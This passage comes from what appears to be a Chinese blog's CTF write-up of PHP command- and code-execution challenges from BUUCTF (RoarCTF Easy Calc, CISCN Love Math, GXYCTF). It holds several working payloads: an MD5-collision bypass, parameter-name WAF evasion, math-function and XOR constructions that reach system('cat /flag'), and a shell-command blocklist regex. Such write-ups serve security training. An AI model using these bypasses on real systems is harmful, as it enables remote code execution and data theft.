src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>然后开始代码审计：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">     echo &#96;$cmd&#96;;</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">     echo (&quot;md5 is funny ~&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>发现这里有命令执行的地方，然后就要绕过这个md5</p><p>这里使用md5碰撞，将url编码后的md5值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714185945464.png" alt="image-20200714185945464"></p><p>然后这里吧ls这些都过滤了，就还能使用dir，然后在根目录发现了flag，这里空格用%20代替，然后cat flag，cat也被过滤了，可以用<code>ca\t</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714192557041.png" alt="image-20200714192557041"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;0341b6e5-2749-4fee-920c-0703c27e8dc7&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>本题要点：</strong></p><ul><li><strong>代码执行</strong></li><li><strong>绕过waf，PHP的字符串解析特性</strong></li><li><strong>关键字过滤</strong></li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100142562.png" alt="image-20200704100142562"></p><p>拿到题目首先查看源码，发现提示：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100223762.png" alt="image-20200704100223762"></p><p><code>$(&#39;#calc&#39;).submit(function()</code>对<code>calc</code>表单操作</p><p>$(“#content”).val() ：</p><p>获取id为content的HTML标签元素的值,是 JQuery ,   $(“#content”)相当于document.getElementById(“content”);    $(“#content”).val()相当于 document.getElementById(“content”).value;</p><p>首先发现一个新页面：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100628245.png" alt="image-20200704100628245"></p><p>尝试注入：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101054473.png" alt="image-20200704101054473"></p><p>但是只要注入字母就会报错，之前的源码也提示存在waf，这里用的是一个新的点：<code>PHP的字符串解析特性</code><br>构造参数<code>? num=phpinfo()</code>（注意num前面有个空格）就能够绕过：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101231082.png" alt="image-20200704101231082"></p><p>然后尝试读取目录，但是<code>/</code>被过滤了，可以使用chr(47)来绕过</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101732870.png" alt="image-20200704101732870"></p><p>然后读取flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101943514.png" alt="image-20200704101943514"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?%20num&#x3D;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math]"></a>[CISCN 2019 初赛]Love Math]</h3><p><strong>本题要点：</strong></p><ul><li>可变函数</li><li>php中函数名默认为字符串</li></ul><p><strong>源码如下：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 关闭错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*<em>PHP preg_match_all() *</em></p><p>preg_match_all 函数用于执行一个全局正则表达式匹配。</p><p>这里将匹配到的存入$used_funcs数组</p><p><strong>dechex()</strong></p><p>dechex() 函数把十进制转换为十六进制。</p><p>*<em>base_convert() *</em></p><p>函数在任意进制之间转换数字。这里将10进制转换成36进制，<code>37907361743</code>转换为<code>hex2bin</code></p><p><strong>hex2bin()</strong></p><p>函数把十六进制值的字符串转换为 ASCII 字符。</p><p><strong>dechex()</strong> </p><p>函数把十进制转换为十六进制。</p><hr><p>首先进行代码审计</p><p>绕过思路：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调用数学函数逐步拼凑出$_GET&#x2F;$_POST</span><br><span class="line">异或得到$__GET&#x2F;$_POST</span><br></pre></td></tr></table></figure><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p><strong>调用数学函数逐步拼凑出$_GET：</strong></p><p>payload1:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?abs&#x3D;cat &#x2F;flag&amp;pow&#x3D;system&amp;c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pow&#125;($$pi&#123;abs&#125;)      &#x2F;&#x2F;system(cat &#x2F;flag)</span><br></pre></td></tr></table></figure><ul><li><p>base_convert(37907361743,10,36)      10进制转成36进制，得到hex2bin</p></li><li><p>Hex2bin 传入 dechex(1598506324)      也就是“_GET”的hex值，将其从hex转换为字符串。</p></li><li><p>$pi就是“_GET”这个字符串了。</p></li><li><p>($$pi)    会调用到$_GET</p></li><li><p>{pow}   等效于[pow]，调用$_GET[‘pow’]</p></li><li><p>后面加上括号，将前面的（$$pi）{pow}的输出结果作为函数名使用，括号里传参数，转换机制同理。</p></li><li><p>($$pi){pow}($$pi{abs})相当于：$_GET[pow]$_GET[abs]</p></li></ul><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>异或得到$_GET[]或$_POST</p><p>payload2：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)&#x2F;&#x2F;exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><strong>本题要点：</strong></p><ul><li><strong>.git泄露</strong></li><li><strong>无参数RCE</strong></li></ul><p>打开页面发现啥也没有，于是使用<code>ctf-wscan-master</code>进行目录扫描，发现存在 <code>.git</code> 文件泄露。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ctf-wscan.py http:&#x2F;&#x2F;6dffd023-f82a-4ffa-aefa-991501ac1a3d.node3.buuoj.cn&#x2F;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200715144715990.png" alt="image-20200715144715990"></p><p>使用 <code>githack</code> 工具获取内部文件：</p>]]></content:encoded>
      
      <comments>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
